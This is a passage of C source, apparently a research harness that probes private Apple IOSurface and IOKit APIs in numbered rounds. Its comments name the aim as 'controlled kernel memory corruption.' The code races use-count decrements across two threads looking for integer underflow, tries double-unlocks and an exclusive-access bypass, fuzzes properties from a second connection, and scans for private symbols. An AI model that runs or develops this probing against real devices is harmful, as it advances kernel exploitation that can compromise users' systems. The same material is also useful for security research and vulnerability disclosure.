        typedef IOSurfaceClientRef (*ClientLookup_t)(uint32_t);
        typedef uint32_t (*ClientGetSID_t)(IOSurfaceClientRef);
        typedef void (*ClientRelease_t)(IOSurfaceClientRef);
        ClientLookup_t cLookup = (ClientLookup_t)dlsym(iosfc, "IOSurfaceClientLookup");
        ClientGetSID_t cGetSID = (ClientGetSID_t)dlsym(iosfc, "IOSurfaceClientGetSurfaceID");
        ClientRelease_t cRelease = (ClientRelease_t)dlsym(iosfc, "IOSurfaceClientRelease");

        if (cGetSID && cLookup) {
            IOSurfaceClientRef client = cLookup(sid);
            if (client) {
                uint32_t csid = cGetSID(client);
                rlog("  ClientGetSurfaceID=%u (expected %u)\n", csid, sid);
                if (cRelease) cRelease(client);
            }
        } else rlog("  not found\n");

        /* Try with invalid/freed surface IDs */
        if (cLookup) {
            for (uint32_t testid = 1; testid <= 5; testid++) {
                IOSurfaceClientRef client = cLookup(testid);
                rlog("  ClientLookup(id=%u)=%p\n", testid, client);
                if (client && cGetSID) {
                    uint32_t csid = cGetSID(client);
                    rlog("    GetSurfaceID=%u\n", csid);
                    if (cRelease) cRelease(client);
                }
            }
        }
        fflush(stdout);
    }

    if (iosfc) dlclose(iosfc);
    __sync_fetch_and_add(&r273_probed, 1);
    rlog("\n*** r273 probe complete ***\n");
    fflush(stdout);
}

/* r272: Deep probe of Client UseCount race, ProtectionOptions, CacheMode,
 * Purgeable, YCbCrMatrix, XPC round-trip, RemoveAllValues, double-unlock.
 * r271 found: ExclusiveAccess is absolute (all keys/connections blocked).
 * Seed only changes on lock, not SetValue. AlignProperty returns pointer-sized values.
 * Key target: ClientDecrementUseCount race for integer underflow. */
static volatile int r272_probed = 0;
static volatile int r272_race_stop = 0;

typedef IOSurfaceClientRef (*ClientLookup_t)(uint32_t);
typedef kern_return_t (*ClientDecUC_t)(IOSurfaceClientRef);
typedef kern_return_t (*ClientIncUC_t)(IOSurfaceClientRef);
typedef void (*ClientRelease_t)(IOSurfaceClientRef);

struct r272_race_ctx {
    ClientDecUC_t decFn;
    IOSurfaceClientRef client;
    int count;
};

static void *r272_race_thread(void *arg) {
    struct r272_race_ctx *ctx = (struct r272_race_ctx *)arg;
    for (int i = 0; i < ctx->count && !r272_race_stop; i++) {
        ctx->decFn(ctx->client);
    }
    return NULL;
}

static void r272_probe(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;

    rlog("\n=== r272: Client UseCount Race + Protection/Cache/Purgeable/XPC ===\n");
    fflush(stdout);

    void *iosfc = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);

    ClientLookup_t clientLookup = NULL;
    ClientDecUC_t clientDec = NULL;
    ClientIncUC_t clientInc = NULL;
    ClientRelease_t clientRelease = NULL;
    if (iosfc) {
        clientLookup = (ClientLookup_t)dlsym(iosfc, "IOSurfaceClientLookup");
        clientDec = (ClientDecUC_t)dlsym(iosfc, "IOSurfaceClientDecrementUseCount");
        clientInc = (ClientIncUC_t)dlsym(iosfc, "IOSurfaceClientIncrementUseCount");
        clientRelease = (ClientRelease_t)dlsym(iosfc, "IOSurfaceClientRelease");
    }

    /* Part 1: Client UseCount — test underflow */
    rlog("\n--- Part 1: Client UseCount underflow test ---\n");
    {
        IOSurfaceClientRef client = clientLookup ? clientLookup(sid) : NULL;
        rlog("  client=%p\n", client);

        if (client && clientDec && clientInc) {
            int uc0 = (int)IOSurfaceGetUseCount(surf);
            rlog("  initial useCount=%d\n", uc0);

            kr = clientInc(client);
            int uc1 = (int)IOSurfaceGetUseCount(surf);
            rlog("  after ClientInc: kr=0x%x useCount=%d\n", kr, uc1);

            kr = clientDec(client);
            int uc2 = (int)IOSurfaceGetUseCount(surf);
            rlog("  after ClientDec: kr=0x%x useCount=%d\n", kr, uc2);

            kr = clientDec(client);
            int uc3 = (int)IOSurfaceGetUseCount(surf);
            rlog("  after ClientDec(below 0?): kr=0x%x useCount=%d\n", kr, uc3);

            kr = clientDec(client);
            int uc4 = (int)IOSurfaceGetUseCount(surf);
            rlog("  after ClientDec(again): kr=0x%x useCount=%d\n", kr, uc4);

            for (int i = 0; i < 5; i++) {
                clientDec(client);
            }
            int uc5 = (int)IOSurfaceGetUseCount(surf);
            rlog("  after 5 more ClientDec: useCount=%d\n", uc5);
        }
        if (client && clientRelease) clientRelease(client);
        fflush(stdout);
    }

    /* Part 2: GetProtectionOptions / GetCacheMode */
    rlog("\n--- Part 2: ProtectionOptions + CacheMode ---\n");
    {
        typedef uint32_t (*GetProtOpt_t)(IOSurfaceRef);
        typedef uint32_t (*GetCacheMode_t)(IOSurfaceRef);
        GetProtOpt_t getProt = NULL;
        GetCacheMode_t getCache = NULL;
        if (iosfc) {
            getProt = (GetProtOpt_t)dlsym(iosfc, "IOSurfaceGetProtectionOptions");
            getCache = (GetCacheMode_t)dlsym(iosfc, "IOSurfaceGetCacheMode");
        }
        if (getProt) {
            uint32_t prot = getProt(surf);
            rlog("  GetProtectionOptions=0x%x (%u)\n", prot, prot);
        } else rlog("  GetProtectionOptions not found\n");

        if (getCache) {
            uint32_t cache = getCache(surf);
            rlog("  GetCacheMode=0x%x (%u)\n", cache, cache);
        } else rlog("  GetCacheMode not found\n");
        fflush(stdout);
    }

    /* Part 3: ClientSetPurgeable */
    rlog("\n--- Part 3: ClientSetPurgeable ---\n");
    {
        typedef kern_return_t (*ClientSetPurge_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
        ClientSetPurge_t setPurge = NULL;
        if (iosfc) setPurge = (ClientSetPurge_t)dlsym(iosfc, "IOSurfaceClientSetPurgeable");

        IOSurfaceClientRef client = clientLookup ? clientLookup(sid) : NULL;
        if (setPurge && client) {
            for (uint32_t state = 0; state <= 3; state++) {
                uint32_t oldState = 0;
                kr = setPurge(client, state, &oldState);
                rlog("  ClientSetPurgeable(%u)=0x%x oldState=%u\n", state, kr, oldState);
            }
        } else rlog("  ClientSetPurgeable not found or no client\n");
        if (client && clientRelease) clientRelease(client);
        fflush(stdout);
    }

    /* Part 4: ClientSetYCbCrMatrix */
    rlog("\n--- Part 4: ClientSetYCbCrMatrix ---\n");
    {
        typedef kern_return_t (*SetMatrix_t)(IOSurfaceClientRef, CFStringRef);
        typedef CFStringRef (*GetMatrix_t)(IOSurfaceRef);
        SetMatrix_t setMatrix = NULL;
        GetMatrix_t getMatrix = NULL;
        if (iosfc) {
            setMatrix = (SetMatrix_t)dlsym(iosfc, "IOSurfaceClientSetYCbCrMatrix");
            getMatrix = (GetMatrix_t)dlsym(iosfc, "IOSurfaceGetYCbCrMatrix");
        }

        IOSurfaceClientRef client = clientLookup ? clientLookup(sid) : NULL;
        if (setMatrix && client) {
            CFStringRef matrices[] = {
                CFSTR("ITU_R_601_4"), CFSTR("ITU_R_709_2"),
                CFSTR("ITU_R_2020"), CFSTR("SMPTE_240M_1995")
            };
            for (int i = 0; i < 4; i++) {
                char buf[32]; CFStringGetCString(matrices[i], buf, 32, kCFStringEncodingUTF8);
                kr = setMatrix(client, matrices[i]);
                rlog("  SetYCbCrMatrix('%s')=0x%x", buf, kr);
                if (getMatrix) {
                    CFStringRef m = getMatrix(surf);
                    if (m) {
                        char mbuf[64]; CFStringGetCString(m, mbuf, 64, kCFStringEncodingUTF8);
                        rlog(" get='%s'\n", mbuf);
                    } else rlog(" get=NULL\n");
                } else rlog("\n");
            }
        } else rlog("  not found or no client\n");
        if (client && clientRelease) clientRelease(client);
        fflush(stdout);
    }

    /* Part 5: XPC round-trip */
    rlog("\n--- Part 5: IOSurfaceCreateXPCObject / LookupFromXPCObject ---\n");
    {
        typedef xpc_object_t (*CreateXPC_t)(IOSurfaceRef);
        typedef IOSurfaceRef (*LookupXPC_t)(xpc_object_t);
        CreateXPC_t createXPC = NULL;
        LookupXPC_t lookupXPC = NULL;
        if (iosfc) {
            createXPC = (CreateXPC_t)dlsym(iosfc, "IOSurfaceCreateXPCObject");
            lookupXPC = (LookupXPC_t)dlsym(iosfc, "IOSurfaceLookupFromXPCObject");
        }
        if (createXPC) {
            xpc_object_t xobj = createXPC(surf);
            rlog("  CreateXPCObject=%p\n", xobj);
            if (xobj && lookupXPC) {
                IOSurfaceRef surf2 = lookupXPC(xobj);
                rlog("  LookupFromXPCObject=%p id=%u (orig id=%u)\n",
                     surf2, surf2 ? IOSurfaceGetID(surf2) : 0, sid);
                if (surf2) CFRelease(surf2);
            }
        } else rlog("  CreateXPCObject not found\n");
        fflush(stdout);
    }

    /* Part 6: RemoveAllValues */
    rlog("\n--- Part 6: IOSurfaceRemoveAllValues ---\n");
    {
        typedef void (*RemoveAll_t)(IOSurfaceRef);
        RemoveAll_t removeAll = NULL;
        if (iosfc) removeAll = (RemoveAll_t)dlsym(iosfc, "IOSurfaceRemoveAllValues");

        IOSurfaceSetValue(surf, CFSTR("test1"), CFSTR("v1"));
        IOSurfaceSetValue(surf, CFSTR("test2"), CFSTR("v2"));
        IOSurfaceSetValue(surf, CFSTR("test3"), CFSTR("v3"));

        typedef CFDictionaryRef (*CopyAll_t)(IOSurfaceRef);
        CopyAll_t copyAll = (CopyAll_t)dlsym(iosfc, "IOSurfaceCopyAllValues");
        if (copyAll) {
            CFDictionaryRef d = copyAll(surf);
            rlog("  before RemoveAll: count=%ld\n", d ? CFDictionaryGetCount(d) : -1);
            if (d) CFRelease(d);
        }

        if (removeAll) {
            removeAll(surf);
            rlog("  RemoveAllValues called\n");
        }

        if (copyAll) {
            CFDictionaryRef d = copyAll(surf);
            rlog("  after RemoveAll: count=%ld\n", d ? CFDictionaryGetCount(d) : -1);
            if (d) CFRelease(d);
        }
        fflush(stdout);
    }

    /* Part 7: ClientUnlock without prior lock (double-unlock) */
    rlog("\n--- Part 7: ClientUnlock without lock ---\n");
    {
        typedef kern_return_t (*ClientUnlock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
        ClientUnlock_t clientUnlock = NULL;
        if (iosfc) clientUnlock = (ClientUnlock_t)dlsym(iosfc, "IOSurfaceClientUnlock");

        IOSurfaceClientRef client = clientLookup ? clientLookup(sid) : NULL;
        if (clientUnlock && client) {
            uint32_t seed = 0;
            kr = clientUnlock(client, 0, &seed);
            rlog("  ClientUnlock(no prior lock, type 0)=0x%x seed=%u\n", kr, seed);
            kr = clientUnlock(client, 1, &seed);
            rlog("  ClientUnlock(no prior lock, type 1)=0x%x seed=%u\n", kr, seed);
            kr = clientUnlock(client, 2, &seed);
            rlog("  ClientUnlock(no prior lock, type 2)=0x%x seed=%u\n", kr, seed);
        } else rlog("  ClientUnlock not found or no client\n");
        if (client && clientRelease) clientRelease(client);
        fflush(stdout);
    }

    /* Part 8: ClientDecrementUseCount race */
    rlog("\n--- Part 8: ClientDecrementUseCount race (2 threads x 100) ---\n");
    {
        IOSurfaceClientRef client = clientLookup ? clientLookup(sid) : NULL;
        if (client && clientDec && clientInc) {
            for (int i = 0; i < 10; i++) clientInc(client);
            int ucBefore = (int)IOSurfaceGetUseCount(surf);
            rlog("  pre-race useCount=%d (after 10 increments)\n", ucBefore);

            r272_race_stop = 0;
            struct r272_race_ctx ctx1 = { clientDec, client, 100 };
            struct r272_race_ctx ctx2 = { clientDec, client, 100 };
            pthread_t t1, t2;
            pthread_create(&t1, NULL, r272_race_thread, &ctx1);
            pthread_create(&t2, NULL, r272_race_thread, &ctx2);
            pthread_join(t1, NULL);
            pthread_join(t2, NULL);

            int ucAfter = (int)IOSurfaceGetUseCount(surf);
            rlog("  post-race useCount=%d (expected ~-190 if no clamp, 0 if clamped)\n", ucAfter);

            if (ucAfter < 0) {
                rlog("  *** UNDERFLOW DETECTED: useCount=%d ***\n", ucAfter);
            } else if (ucAfter == 0) {
                rlog("  clamped at 0 — no underflow\n");
            } else {
                rlog("  race result: %d remaining\n", ucAfter);
            }
        } else rlog("  race setup failed\n");
        if (client && clientRelease) clientRelease(client);
        fflush(stdout);
    }

    if (iosfc) dlclose(iosfc);
    __sync_fetch_and_add(&r272_probed, 1);
    rlog("\n*** r272 probe complete ***\n");
    fflush(stdout);
}

/* r271: Explore newly discovered private APIs from r270 Part 7 symbol scan.
 * r270 found: IOSurfaceGetSeed, IOSurfaceSetOwnership, Get/SetBulkAttachments,
 *   AlignProperty, GetPropertyAlignment, GetPropertyMaximum, GetSubsampling.
 * Also: ExclusiveAccess from SetCFProperties — investigate second connection,
 *   second surface, and specific property keys that might unlock access.
 * Goal: find a path to controlled kernel memory corruption. */
static volatile int r271_probed = 0;

static void r271_probe(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;

    rlog("\n=== r271: Private API Exploration + ExclusiveAccess Bypass ===\n");
    fflush(stdout);

    mach_port_t sp = IOSurfaceCreateMachPort(surf);
    rlog("  surfMachPort=%u surfID=%u\n", sp, sid);
    fflush(stdout);

    void *iosfc = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);

    /* Part 1: IOSurfaceGetSeed — compare with ClientLock seed */
    rlog("\n--- Part 1: IOSurfaceGetSeed ---\n");
    {
        typedef uint32_t (*IOSurfaceGetSeed_t)(IOSurfaceRef);
        IOSurfaceGetSeed_t getSeed = NULL;
        if (iosfc) getSeed = (IOSurfaceGetSeed_t)dlsym(iosfc, "IOSurfaceGetSeed");
        if (getSeed) {
            uint32_t seed_before = getSeed(surf);
            rlog("  GetSeed before lock: %u\n", seed_before);

            IOSurfaceLock(surf, 0, NULL);
            uint32_t seed_locked = getSeed(surf);
            rlog("  GetSeed while locked (type 0): %u\n", seed_locked);
            IOSurfaceUnlock(surf, 0, NULL);

            uint32_t seed_after = getSeed(surf);
            rlog("  GetSeed after unlock: %u\n", seed_after);

            IOSurfaceSetValue(surf, CFSTR("test_key"), CFSTR("test_val"));
            uint32_t seed_modified = getSeed(surf);
            rlog("  GetSeed after SetValue: %u\n", seed_modified);
            IOSurfaceRemoveValue(surf, CFSTR("test_key"));

            uint32_t seed_removed = getSeed(surf);
            rlog("  GetSeed after RemoveValue: %u\n", seed_removed);
        } else {
            rlog("  IOSurfaceGetSeed not found\n");
        }
        fflush(stdout);
    }

    /* Part 2: IOSurfaceSetOwnership */
    rlog("\n--- Part 2: IOSurfaceSetOwnership ---\n");
    {
        typedef kern_return_t (*IOSurfaceSetOwnership_t)(IOSurfaceRef, task_t, int, int);
        IOSurfaceSetOwnership_t setOwn = NULL;
        if (iosfc) setOwn = (IOSurfaceSetOwnership_t)dlsym(iosfc, "IOSurfaceSetOwnership");
        if (setOwn) {
            kr = setOwn(surf, mach_task_self(), 0, 0);
            rlog("  SetOwnership(self,0,0)=0x%x\n", kr);

            kr = setOwn(surf, mach_task_self(), 1, 0);
            rlog("  SetOwnership(self,1,0)=0x%x\n", kr);

            kr = setOwn(surf, mach_task_self(), 0, 1);
            rlog("  SetOwnership(self,0,1)=0x%x\n", kr);

            kr = setOwn(surf, MACH_PORT_NULL, 0, 0);
            rlog("  SetOwnership(NULL,0,0)=0x%x\n", kr);
        } else {
            rlog("  IOSurfaceSetOwnership not found\n");
        }
        fflush(stdout);
    }

    /* Part 3: IOSurfaceGet/SetBulkAttachments */
    rlog("\n--- Part 3: IOSurfaceGet/SetBulkAttachments ---\n");
    {
        typedef kern_return_t (*SetBulk_t)(IOSurfaceRef, CFDictionaryRef);
        typedef CFDictionaryRef (*GetBulk_t)(IOSurfaceRef);
        SetBulk_t setBulk = NULL;
        GetBulk_t getBulk = NULL;
        if (iosfc) {
            setBulk = (SetBulk_t)dlsym(iosfc, "IOSurfaceSetBulkAttachments");
            getBulk = (GetBulk_t)dlsym(iosfc, "IOSurfaceGetBulkAttachments");
        }

        if (getBulk) {
            uintptr_t raw = (uintptr_t)getBulk(surf);
            rlog("  GetBulkAttachments raw=0x%lx", (unsigned long)raw);
            if (raw > 0x100000000UL) {
                rlog(" count=%ld\n", CFDictionaryGetCount((CFDictionaryRef)raw));
            } else {
                rlog(" (kern_return_t=0x%x)\n", (uint32_t)raw);
            }
        } else {
            rlog("  IOSurfaceGetBulkAttachments not found\n");
        }

        if (setBulk) {
            CFMutableDictionaryRef bd = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(bd, CFSTR("test_attach"), CFSTR("val"));
            kr = setBulk(surf, bd);
            rlog("  SetBulkAttachments(1 entry)=0x%x\n", kr);
            CFRelease(bd);

            rlog("  (skipping second GetBulk — first returned error code, may crash)\n");
        } else {
            rlog("  IOSurfaceSetBulkAttachments not found\n");
        }
        fflush(stdout);
    }

    /* Part 4: Property alignment/maximum/subsampling */
    rlog("\n--- Part 4: AlignProperty/GetPropertyAlignment/Maximum/Subsampling ---\n");
    {
        typedef size_t (*AlignProp_t)(IOSurfaceRef, CFStringRef, size_t);
        typedef size_t (*GetAlign_t)(IOSurfaceRef, CFStringRef);
        typedef size_t (*GetMax_t)(IOSurfaceRef, CFStringRef);
        typedef uint32_t (*GetSub_t)(IOSurfaceRef);
        AlignProp_t alignProp = NULL;
        GetAlign_t getAlign = NULL;
        GetMax_t getMax = NULL;
        GetSub_t getSub = NULL;
        if (iosfc) {
            alignProp = (AlignProp_t)dlsym(iosfc, "IOSurfaceAlignProperty");
            getAlign = (GetAlign_t)dlsym(iosfc, "IOSurfaceGetPropertyAlignment");
            getMax = (GetMax_t)dlsym(iosfc, "IOSurfaceGetPropertyMaximum");
            getSub = (GetSub_t)dlsym(iosfc, "IOSurfaceGetSubsampling");
        }

        CFStringRef propKeys[] = {
            CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
            CFSTR("IOSurfaceBytesPerRow"), CFSTR("IOSurfaceAllocSize"),
            CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")
        };
        int nk = 6;

        if (getAlign) {
            for (int i = 0; i < nk; i++) {
                char buf[64]; CFStringGetCString(propKeys[i], buf, 64, kCFStringEncodingUTF8);
                size_t a = getAlign(surf, propKeys[i]);
                rlog("  GetPropertyAlignment(%s)=%zu\n", buf, a);
            }
        } else rlog("  GetPropertyAlignment not found\n");

        if (getMax) {
            for (int i = 0; i < nk; i++) {
                char buf[64]; CFStringGetCString(propKeys[i], buf, 64, kCFStringEncodingUTF8);
                size_t m = getMax(surf, propKeys[i]);
                rlog("  GetPropertyMaximum(%s)=%zu\n", buf, m);
            }
        } else rlog("  GetPropertyMaximum not found\n");

        if (alignProp) {
            size_t a1 = alignProp(surf, CFSTR("IOSurfaceBytesPerRow"), 100);
            size_t a2 = alignProp(surf, CFSTR("IOSurfaceBytesPerRow"), 256);
            size_t a3 = alignProp(surf, CFSTR("IOSurfaceBytesPerRow"), 4096);
            rlog("  AlignProperty(BPR,100)=%zu (256)=%zu (4096)=%zu\n", a1, a2, a3);
        } else rlog("  AlignProperty not found\n");

        if (getSub) {
            uint32_t sub = getSub(surf);
            rlog("  GetSubsampling=%u\n", sub);
        } else rlog("  GetSubsampling not found\n");
        fflush(stdout);
    }

    /* Part 5: Try SetCFProperties from SECOND connection */
    rlog("\n--- Part 5: SetCFProperties from second connection ---\n");
    {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching("IOSurfaceRoot"));
        io_connect_t conn1 = IO_OBJECT_NULL, conn2 = IO_OBJECT_NULL;
        IOServiceOpen(svc, mach_task_self(), 0, &conn1);
        IOServiceOpen(svc, mach_task_self(), 0, &conn2);
        rlog("  conn1=%u conn2=%u\n", conn1, conn2);

        typedef kern_return_t (*SetCFProps_t)(io_connect_t, CFTypeRef);
        typedef kern_return_t (*SetCFProp_t)(io_connect_t, CFStringRef, CFTypeRef);
        SetCFProps_t setCFProps = NULL;
        SetCFProp_t setCFProp = NULL;
        if (iokit) {
            setCFProps = (SetCFProps_t)dlsym(iokit, "IOConnectSetCFProperties");
            setCFProp = (SetCFProp_t)dlsym(iokit, "IOConnectSetCFProperty");
        }

        if (setCFProps) {
            CFMutableDictionaryRef d = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(d, CFSTR("test"), CFSTR("val"));

            kr = setCFProps(conn1, d);
            rlog("  SetCFProperties(conn1,dict)=0x%x\n", kr);
            kr = setCFProps(conn2, d);
            rlog("  SetCFProperties(conn2,dict)=0x%x\n", kr);
            CFRelease(d);
        }

        /* Try specific IOSurface-related keys */
        if (setCFProp) {
            CFStringRef keys[] = {
                CFSTR("IOSurfaceRootUserClient"),
                CFSTR("IOSurfaceExclusiveAccess"),
                CFSTR("IOSurfaceLockMode"),
                CFSTR("IOSurfaceGlobalLock"),
                CFSTR("exclusive"),
                CFSTR("lock"),
                CFSTR("unlock"),
                CFSTR("IOSurfaceID")
            };
            int nkeys = 8;
            CFNumberRef zero = CFNumberCreate(NULL, kCFNumberIntType, &(int){0});
            CFNumberRef one = CFNumberCreate(NULL, kCFNumberIntType, &(int){1});
            CFNumberRef sidNum = CFNumberCreate(NULL, kCFNumberIntType, &(int){sid});

            for (int i = 0; i < nkeys; i++) {
                char buf[64]; CFStringGetCString(keys[i], buf, 64, kCFStringEncodingUTF8);
                kr = setCFProp(conn1, keys[i], zero);
                rlog("  SetCFProperty(conn1,'%s',0)=0x%x\n", buf, kr);
                kr = setCFProp(conn1, keys[i], one);
                rlog("  SetCFProperty(conn1,'%s',1)=0x%x\n", buf, kr);
            }
            kr = setCFProp(conn1, CFSTR("IOSurfaceID"), sidNum);
            rlog("  SetCFProperty(conn1,'IOSurfaceID',sid=%u)=0x%x\n", sid, kr);

            CFRelease(zero); CFRelease(one); CFRelease(sidNum);
        }

        IOServiceClose(conn1);
        IOServiceClose(conn2);
        IOObjectRelease(svc);
        fflush(stdout);
    }

    /* Part 6: SetCFProperties on SECOND surface */
    rlog("\n--- Part 6: SetCFProperties on second surface ---\n");
    {
        int w2 = 32, h2 = 32, bpe2 = 4, bpr2 = w2*bpe2, pf2 = 0x42475241;
        int as2 = bpr2*h2;
        CFMutableDictionaryRef p2 = CFDictionaryCreateMutable(NULL, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef wn2 = CFNumberCreate(NULL, kCFNumberIntType, &w2);
        CFNumberRef hn2 = CFNumberCreate(NULL, kCFNumberIntType, &h2);
        CFNumberRef bn2 = CFNumberCreate(NULL, kCFNumberIntType, &bpe2);
        CFNumberRef rn2 = CFNumberCreate(NULL, kCFNumberIntType, &bpr2);
        CFNumberRef pfn2 = CFNumberCreate(NULL, kCFNumberIntType, &pf2);
        CFNumberRef asn2 = CFNumberCreate(NULL, kCFNumberIntType, &as2);
        CFDictionarySetValue(p2, CFSTR("IOSurfaceWidth"), wn2);
        CFDictionarySetValue(p2, CFSTR("IOSurfaceHeight"), hn2);
        CFDictionarySetValue(p2, CFSTR("IOSurfaceBytesPerElement"), bn2);
        CFDictionarySetValue(p2, CFSTR("IOSurfaceBytesPerRow"), rn2);
        CFDictionarySetValue(p2, CFSTR("IOSurfacePixelFormat"), pfn2);
        CFDictionarySetValue(p2, CFSTR("IOSurfaceAllocSize"), asn2);
        CFRelease(wn2); CFRelease(hn2); CFRelease(bn2); CFRelease(rn2); CFRelease(pfn2); CFRelease(asn2);

        IOSurfaceRef surf2 = IOSurfaceCreate(p2);
        rlog("  surf2=%p id=%u\n", surf2, surf2 ? IOSurfaceGetID(surf2) : 0);
        CFRelease(p2);

        if (surf2) {
            io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                IOServiceMatching("IOSurfaceRoot"));
            io_connect_t c3 = IO_OBJECT_NULL;
            IOServiceOpen(svc, mach_task_self(), 0, &c3);

            typedef kern_return_t (*SetCFProps_t)(io_connect_t, CFTypeRef);
            SetCFProps_t setCFProps = NULL;
            if (iokit) setCFProps = (SetCFProps_t)dlsym(iokit, "IOConnectSetCFProperties");

            if (setCFProps) {
                CFMutableDictionaryRef d2 = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                uint32_t sid2 = IOSurfaceGetID(surf2);
                CFNumberRef sidN = CFNumberCreate(NULL, kCFNumberIntType, &(int){sid2});
                CFDictionarySetValue(d2, CFSTR("IOSurfaceID"), sidN);
                CFDictionarySetValue(d2, CFSTR("test"), CFSTR("val"));

                kr = setCFProps(c3, d2);
                rlog("  SetCFProperties(conn3,{ID=%u,test})=0x%x\n", sid2, kr);
                CFRelease(d2); CFRelease(sidN);

                /* Try with just one key */
                CFMutableDictionaryRef d3 = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(d3, CFSTR("IOSurfaceID"), CFNumberCreate(NULL, kCFNumberIntType, &(int){sid2}));
                kr = setCFProps(c3, d3);
                rlog("  SetCFProperties(conn3,{ID=%u only})=0x%x\n", sid2, kr);
                CFRelease(d3);
            }

            IOServiceClose(c3);
            IOObjectRelease(svc);
            CFRelease(surf2);
        }
        fflush(stdout);
    }

    /* Part 7: IOSurfaceSetValue with large/special values */
    rlog("\n--- Part 7: SetValue with large/special values + seed tracking ---\n");
    {
        typedef uint32_t (*IOSurfaceGetSeed_t)(IOSurfaceRef);
        IOSurfaceGetSeed_t getSeed = NULL;
        if (iosfc) getSeed = (IOSurfaceGetSeed_t)dlsym(iosfc, "IOSurfaceGetSeed");

        uint32_t s0 = getSeed ? getSeed(surf) : 0;
        rlog("  seed start=%u\n", s0);

        /* Large data value */
        uint8_t bigbuf[4096];
        memset(bigbuf, 0x41, sizeof(bigbuf));
        CFDataRef bigData = CFDataCreate(NULL, bigbuf, sizeof(bigbuf));
        IOSurfaceSetValue(surf, CFSTR("big_data"), bigData);
        uint32_t s1 = getSeed ? getSeed(surf) : 0;
        rlog("  after SetValue(big_data, 4096 bytes) seed=%u\n", s1);

        CFTypeRef got = IOSurfaceCopyValue(surf, CFSTR("big_data"));
        if (got && CFGetTypeID(got) == CFDataGetTypeID()) {
            rlog("  CopyValue(big_data) len=%ld\n", CFDataGetLength((CFDataRef)got));
            CFRelease(got);
        } else {
            rlog("  CopyValue(big_data) = %p\n", got);
        }
        CFRelease(bigData);
        IOSurfaceRemoveValue(surf, CFSTR("big_data"));

        /* Overwrite standard property names */
        CFNumberRef fakeW = CFNumberCreate(NULL, kCFNumberIntType, &(int){9999});
        IOSurfaceSetValue(surf, CFSTR("IOSurfaceWidth"), fakeW);
        uint32_t realW = (uint32_t)IOSurfaceGetWidth(surf);
        uint32_t s2 = getSeed ? getSeed(surf) : 0;
        rlog("  after SetValue('IOSurfaceWidth',9999) actual width=%u seed=%u\n", realW, s2);
        IOSurfaceRemoveValue(surf, CFSTR("IOSurfaceWidth"));
        CFRelease(fakeW);

        /* Set many properties rapidly */
        for (int i = 0; i < 50; i++) {
            char kbuf[32];
            snprintf(kbuf, sizeof(kbuf), "rapid_%d", i);
            CFStringRef k = CFStringCreateWithCString(NULL, kbuf, kCFStringEncodingUTF8);
            CFNumberRef v = CFNumberCreate(NULL, kCFNumberIntType, &i);
            IOSurfaceSetValue(surf, k, v);
            CFRelease(k); CFRelease(v);
        }
        uint32_t s3 = getSeed ? getSeed(surf) : 0;
        rlog("  after 50 rapid SetValues seed=%u (delta from start=%u)\n", s3, s3 - s0);

        /* Clean up rapid props */
        for (int i = 0; i < 50; i++) {
            char kbuf[32];
            snprintf(kbuf, sizeof(kbuf), "rapid_%d", i);
            CFStringRef k = CFStringCreateWithCString(NULL, kbuf, kCFStringEncodingUTF8);
            IOSurfaceRemoveValue(surf, k);
            CFRelease(k);
        }
        uint32_t s4 = getSeed ? getSeed(surf) : 0;
        rlog("  after removing 50 props seed=%u (delta from start=%u)\n", s4, s4 - s0);
        fflush(stdout);
    }

    /* Part 8: Extended private symbol scan for more APIs */
    rlog("\n--- Part 8: Extended symbol scan ---\n");
    {
        const char *syms[] = {
            "IOSurfaceGetAllocSize", "IOSurfaceGetBaseAddressOfPlane",
            "IOSurfaceGetPlaneCount", "IOSurfaceGetWidthOfPlane",
            "IOSurfaceGetHeightOfPlane", "IOSurfaceGetBytesPerRowOfPlane",
            "IOSurfaceGetBytesPerElementOfPlane", "IOSurfaceGetElementWidthOfPlane",
            "IOSurfaceGetElementHeightOfPlane", "IOSurfaceGetNumberOfComponentsOfPlane",
            "IOSurfaceSetPurgeableState", "IOSurfaceGetUseCount",
            "IOSurfaceCopyAllValues", "IOSurfaceRemoveAllValues",
            "IOSurfaceSetDataValueBytes", "IOSurfaceCopyDataValueBytes",
            "IOSurfaceCreateXPCObject", "IOSurfaceLookupFromXPCObject",
            "IOSurfaceSetNotificationPort", "IOSurfaceGetNotificationPort",
            "IOSurfaceCreateMachPort", "IOSurfaceLookupFromMachPort",
            "IOSurfaceCreateImage", "IOSurfaceSetCompletionNotification",
            "IOSurfaceClientCreate", "IOSurfaceClientRelease",
            "IOSurfaceClientLookup", "IOSurfaceClientLock",
            "IOSurfaceClientUnlock", "IOSurfaceClientAlign",
            "IOSurfaceClientGetSurfaceID", "IOSurfaceClientGetPlaneCount",
            "IOSurfaceClientSetYCbCrMatrix", "IOSurfaceGetYCbCrMatrix",
            "IOSurfaceClientSetColorSpace", "IOSurfaceGetColorSpace",
            "IOSurfaceClientIncrementUseCount", "IOSurfaceClientDecrementUseCount",
            "IOSurfaceClientSetPurgeable", "IOSurfaceSetCacheMode",
            "IOSurfaceGetCacheMode", "IOSurfaceClientSetCacheMode",
            "IOSurfaceSetProtectionOptions", "IOSurfaceGetProtectionOptions",
